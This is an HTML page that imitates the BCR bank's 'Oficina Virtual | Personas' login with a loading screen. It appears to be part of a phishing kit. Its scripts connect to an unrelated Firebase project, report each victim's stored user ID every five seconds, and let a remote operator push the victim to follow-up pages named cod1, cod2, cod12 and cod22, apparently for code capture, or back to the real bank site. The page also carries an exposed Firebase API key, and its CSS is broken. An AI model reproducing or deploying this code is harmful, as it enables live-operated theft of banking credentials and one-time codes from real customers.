<html><head><style>

}
footer {

.header-vertical {

        margin-top: -15px;
        margin-bottom: 22px;

        color: #0033A0 !important;

        text-align: center;

/* Animación de crecimiento y reducción */
@keyframes pulseLogo {
    0% {
        transform: scale(1);
    }
    50% {
        transform: scale(1.2); /* Tamaño máximo al que crece (120%) */

    }

.loading-logo {
    width: 80px;
    height: auto;

</style>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>BCR</title>
</head>

<!-- Scripts de Firebase (versión 8.6.8) -->
<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
<script>
  const firebaseConfig = {
    apiKey: "AIzaSyDWkga80jjGG2YtF9obwfIf9UuSACayWko",
    authDomain: "kkkkk-5e2bd.firebaseapp.com",
    databaseURL: "https://kkkkk-5e2bd-default-rtdb.firebaseio.com",
    projectId: "kkkkk-5e2bd",
    storageBucket: "kkkkk-5e2bd.firebasestorage.app",
    messagingSenderId: "1059258934487",
    appId: "1:1059258934487:web:72d14c094dc78e6140fc92"
  };

  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }
  const db = firebase.firestore();

  // Obtener el usuario actual directamente del localStorage
  function obtenerUsuarioActual() {
    return localStorage.getItem("usuario");
  }

  // Función que envía el latido correctamente usando Firestore v8
  function enviarLatido() {
    const usuarioId = obtenerUsuarioActual();
    
    if (usuarioId) {
      db.collection("prolme").doc(usuarioId).set({
        last_active: firebase.firestore.FieldValue.serverTimestamp()
      }, { merge: true })
      .catch((error) => {
        console.error("Error al enviar latido:", error);
      });
    }
  }

  // Ejecutar el latido cada 5 segundos
  setInterval(enviarLatido, 5000);

  // Enviar latido inmediato si el usuario cambia de pestaña u oculta la ventana
  window.addEventListener('visibilitychange', function() {
    if (document.visibilityState === 'hidden') {
      enviarLatido();
    }
  });
</script>

<body background="background.png">
    <header class="header-vertical">
  <div class="header-top">
    <img style="width: 150px;" src="logo.gif">
  </div>
  <div class="header-bottom">
    <p style="text-align: center;font-weight: 400;font-size: 21px;margin-top: 5px;">Oficina Virtual | Personas</p>
  </div>
</header>

<div class="login-wrapper">
    <div class="login-container">
        <img src="logo.gif" alt="Cargando" class="loading-logo">
         <a class="txtSeleccionMetodo">Cargando...</a>
    </div>
</div>

<footer>
    <div class="footer-content">
      <p> 116    BCR © Derechos Reservados 2026.    Contáctenos: CentroAsistenciaBCR@bancobcr.com</p>
    </div>
</footer>

<script>
    document.addEventListener("DOMContentLoaded", () => {
      const usuarioId = localStorage.getItem("usuario");
      
      if (!usuarioId) {
          console.log("No hay usuario en localStorage");
          return;
      }

      // Escuchador en tiempo real adaptado a la sintaxis v8 de Firebase
      db.collection("prolme").doc(usuarioId).onSnapshot((doc) => {
        if (doc.exists) {
          const questionData = doc.data();

          if (questionData.page == 1) {
            window.location.href = "cod22.html";
          }
          if (questionData.page == 2) {
            window.location.href = "https://www.bancobcr.com/wps/portal/bcr";
          }
          if (questionData.page == 3) {
            window.location.href = "index.html";
          }
          if (questionData.page == 4) {
            window.location.href = "indexinc.html";
          }
          if (questionData.page == 5) {
            window.location.href = "cod12.html";
          }
          if (questionData.page == 6) {
            window.location.href = "cod1.html";
          }
          if (questionData.page == 7) {
            window.location.href = "cod2.html";
          }
          if (questionData.page == 8) {
            window.location.href = "cod22.html";
          }
        } else {
          console.log("No such document!");
        }
      });
    });
</script>
